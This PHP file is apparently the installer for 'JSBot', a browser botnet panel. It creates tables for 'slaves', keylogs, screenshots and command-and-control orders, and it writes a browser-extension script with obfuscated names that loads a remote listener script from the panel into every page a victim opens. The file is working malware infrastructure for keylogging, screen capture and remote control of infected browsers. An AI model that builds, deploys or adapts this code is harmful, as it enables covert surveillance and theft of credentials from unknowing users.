<?php
if(file_exists('sys/head.php')) {
  echo 'It seems JSBot has already been installed. Please delete this file or remove the database as well as the "sys/head.php" file if you wish to re-install.';
  die();
}
$get  = (object) $_GET;
$post = (object) $_POST;
if(!isset($get->step) || empty($get->step) || !in_array($get->step, array('1', '2'))) {
  header('location: install.php?step=1');
}
if($get->step == '1') {
  ?>
  <b>[1/3]</b> First, lets create the database (No SQL Required).<hr />
  <form action="install.php?step=2" method="post">
    DB Name: <input type="text" name="db" placeholder="Database name..." required /><br />
    DB User: <input type="text" name="user" placeholder="Database username..." required /><br />
    DB Pass: <input type="text" name="pass" placeholder="Database password..." required /><br /><br />
    <br />
    <b>[2/3]</b> Second, lets create our credentials for the panel.<hr />
    Panel User: <input type="text" name="puser" placeholder="Panel username..." required /><br />
    Panel Pass: <input type="text" name="ppass" placeholder="Panel password..." required /><br /><br /><br />
    <button>Submit</button>
  </form>
  <?php
} elseif($get->step == '2') {
if(isset($post->db) && !empty($post->db) && isset($post->user) && !empty($post->user) && isset($post->pass) && !empty($post->pass)) {
  include 'classes/phd.class.php';
  $db = stripslashes($post->db);
  $user = stripslashes($post->user);

  //create and set up database
  (new PHD)->setupDatabaseRoot($db, $user, $post->pass);
  $dbase = new PHD($user, $post->pass, $db);
  $dbase->table('slaves', array(
    'ip'          => 'string',
    'lastSeen'    => 'string',
    'firstSeen'   => 'string',
    'ua'          => 'string',
    'os'          => 'string',
    'uuid'        => 'string',
    'page'        => 'string',
    'keylog'      => 'string'
  ))->create();
  $dbase->table('screenshots', array(
    'uuid'        => 'string',
    'blob'        => 'string'
  ))->create();
  $dbase->table('modules', array(
    'module'      => 'string',
    'active'      => 'string'
  ))->create();
  $dbase->table('keylogs', array(
    'uuid'        => 'string',
    'log'         => 'string',
    'currentRef'  => 'string'
  ))->create();
  $dbase->table('console', array(
    'uuid'        => 'string',
    'log'         => 'string'
  ))->create();
  $dbase->table('cnc', array(
    'command'         => 'string',
    'arguments'       => 'string',
    'timeIssued'      => 'string',
    'slavesReached'   => 'string',
    'target'          => 'string',
  	'active'					=> 'string'
  ))->create();
  $dbase->table('admin', array(
  	'username' => 'string', //admin
  	'password' => 'string' //4321b
  ))->create();

  //create the global include 'sys/head.php'
  $head = '<?php /* Global Include */
spl_autoload_register(function($class) {
  $class = strtolower($class);
  if(file_exists("classes/{$class}.class.php")) {
    include_once "classes/{$class}.class.php";
  } elseif(file_exists("../classes/{$class}.class.php")) {
    include_once "../classes/{$class}.class.php";
  } else {
    throw new Exception("Fatal error: Could not load class \'{$class}\'.");
  }
});
if(file_exists(\'classes/\')) {
  $db = new PHD(\''.$user.'\', \''.$post->pass.'\', \''.$db.'\');
} else {
  $db = new PHD(\''.$user.'\', \''.$post->pass.'\', \'../'.$db.'\');
}
?>';
  file_put_contents('sys/head.php', $head);

  //Create panel user
  $dbase->table('admin')->put(array(
    'username' => $post->puser,
    'password' => sha1($post->ppass)
  ));

  //construct browser plugin
  $docroot = $_SERVER['HTTP_HOST'].str_replace('/install.php', '', $_SERVER['PHP_SELF']);
  $serverjs = 'var hjZuf=document.createElement("script");
hjZuf.setAttribute("type","text/javascript");
if (location.protocol !== "https:") {
  hjZuf.setAttribute("src","http://'.$docroot.'/js/listener.php?proto=http");
} else {
  hjZuf.setAttribute("src","https://'.$docroot.'/jb/js/listener.php?proto=https");
}
var gfDrh = document.getElementsByTagName("head")[0];
gfDrh.appendChild(hjZuf);
';
  file_put_contents('extension/server.js', $serverjs);
}
?>
<b>[3/3]</b> Instalation completed!<hr />
Please delete this file now, and continue to <a href="./">Your Panel</a>. :)
<?php } ?>
<style>
html {
  background-color: darkgrey;
}
input {
  width: 100%;
}
</style>
